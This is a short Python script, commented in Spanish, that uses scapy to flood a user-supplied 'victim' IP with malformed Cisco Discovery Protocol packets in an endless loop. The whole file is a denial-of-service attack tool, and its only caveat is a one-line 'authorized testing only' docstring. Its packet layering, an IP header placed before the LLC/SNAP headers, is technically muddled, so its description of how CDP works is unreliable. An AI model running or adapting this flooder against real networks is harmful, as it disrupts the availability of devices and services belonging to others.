#!/usr/bin/env python3
"""
CDP DoS Script
Use with extreme caution. For authorized testing only.
"""

from scapy.all import *
import sys
import time

def get_input():
    """Gets target and interface from user."""
    if len(sys.argv) == 3:
        target_ip = sys.argv[1]
        interface = sys.argv[2]
    else:
        target_ip = input("Ingrese la IP de la víctima: ").strip()
        interface = input("Ingrese la interfaz de red (ej: eth0, wlan0): ").strip()
    return target_ip, interface

def create_cdp_packet(target_ip):
    """
    Crea un paquete CDP malformado con dirección de destino específica.
    CDP es un protocolo de capa 2, pero forzamos el encaminamiento con IP.
    """
    # Capa Ethernet - Dirección MAC destino broadcast de Cisco
    eth = Ether(dst="01:00:0c:cc:cc:cc")
    # Capa IP - dirigida a la víctima
    ip = IP(dst=target_ip)
    # Capa LLC para SNAP
    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=0x2000)
    # Payload CDP malformado/vacío
    cdp = b"\x00\x00\x00\x00\x00\x00\x00\x00" * 50  # Payload repetitivo

    # Ensamblar paquete completo
    pkt = eth / ip / llc / snap / cdp
    return pkt

def main():
    target_ip, interface = get_input()
    print(f"[+] Iniciando ataque CDP DoS hacia {target_ip} en interfaz {interface}")
    print("[+] Presione Ctrl+C para detener.")

    packet = create_cdp_packet(target_ip)
    count = 0

    try:
        while True:
            sendp(packet, iface=interface, verbose=0)
            count += 1
            if count % 100 == 0:
                print(f"[+] Paquetes enviados: {count}", end='\r')
            time.sleep(0.01)  # Pequeña pausa para no saturar la CPU
    except KeyboardInterrupt:
        print(f"\n[+] Ataque detenido. Total de paquetes enviados: {count}")
    except PermissionError:
        print("[!] Error: Necesita permisos de superusuario (sudo).")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
